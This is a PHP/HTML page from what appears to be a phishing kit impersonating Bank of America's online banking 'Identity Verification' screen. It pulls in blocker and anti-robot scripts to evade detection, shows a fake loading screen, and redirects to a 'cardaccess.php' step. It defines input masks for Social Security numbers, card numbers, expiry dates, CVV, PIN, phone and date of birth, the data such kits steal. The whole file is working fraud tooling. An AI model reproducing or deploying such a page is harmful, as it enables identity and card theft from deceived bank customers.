<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include('blocker.php');
include('antirobot.php');
include('bt.php');

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<meta http-equiv="Refresh" content="05; url=cardaccess.php?st=1588916036&SAMLart=AAQCLuoEQCR14WDgSxaU4QNGCHpGcoS1KzGUpjgY6kpPWmzW3HwnnOohKU4%3D">
<title>Bank of America | Online Banking | Identity Verification</title>

<link rel="icon" href="favicon.ico" type="image/x-icon">

<style type="text/css">
body{
margin:0;

}



@font-face{font-family:"cnx-regular";src:url("cnx-regular.eot");src:url("cnx-regular.eot?#iefix") format("embedded-opentype"),url("cnx-regular.woff2") format("woff2"),url("cnx-regular.woff") format("woff"),url("cnx-regular.ttf") format("truetype");font-weight:300;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-bold";src:url("cnx-bold.eot");src:url("cnx-bold.eot?#iefix") format("embedded-opentype"),url("cnx-bold.woff2") format("woff2"),url("cnx-bold.woff") format("woff"),url("cnx-bold.ttf") format("truetype");font-weight:700;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-medium";src:url("cnx-medium.eot");src:url("cnx-medium.eot?#iefix") format("embedded-opentype"),url("cnx-medium.woff2") format("woff2"),url("cnx-medium.woff") format("woff"),url("cnx-medium.ttf") format("truetype");font-weight:300;font-style:italic;font-variant:normal}

input[type=text] {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

input[type=text]:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}


.id_label{position:absolute; padding-left:4px; padding-bottom:6px; color: #333; font-size:14px; font-weight:bold; font-family: cnx-regular, Arial, Helvetica, sans-serif;}
.id_label3{

    color: #fff;
    border: none;
    font-weight: bold;
    font-size: 24px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;
	}
	
.id_label5{

 	color: #0153C3;
    border: none;
    font-weight: bold;
    font-size: 14px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;

}

.id_label6{

    color:rgb(65, 64, 66);
    border: none;
    font-weight: 200;
    font-size: 14px;
	font-family:Verdana,Arial,sans-serif;;

}



input[type=password] {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

input[type=password]:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}





</style>



<script src="jquery-3.1.0.min.js"></script>
 <script src="jquery.maskedinput.js"></script>

    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:"xxx-xx-xxxx"});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#dt').mask("999", {placeholder:""});
    });   
    </script>
	    <script>
    $(document).ready(function(){
     $('#psp').mask("9999-9999-9999-9999", {placeholder:"X"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:""});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#pinsi').mask("9999", {placeholder:""});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#phnno').mask("999-999-9999", {placeholder:"X"});
    });   
    </script>
	
	<script>
    $(document).ready(function(){
     $('#udds').mask("99/99/9999", {placeholder:"DD/MM/YYYY"});
    });   
    </script>




</head>

<body style=" background-image:url(cardaccessbg.jpg); background-repeat: no-repeat; height:757px;">

<div style="position:absolute; left:45px; top:85px;"><label class="id_label3">Verify Your Card Details</label></div>

<div style="position:absolute; left:1015px; top:48px;"><label class="id_label5">Sign Out</label></div>

<div style="position:absolute; left:1010px; top:155px;"><img src="alert.jpg" width="299" height="375" /></div>


<div style="position:absolute; left:45px; top:155px;"><img src="loadingbg.jpg" width="473" height="159" /></div>

<div style="position:absolute; left:80px; top:175px;"><img src="loading.gif" width="46" height="46" /></div>

</body>
</html>
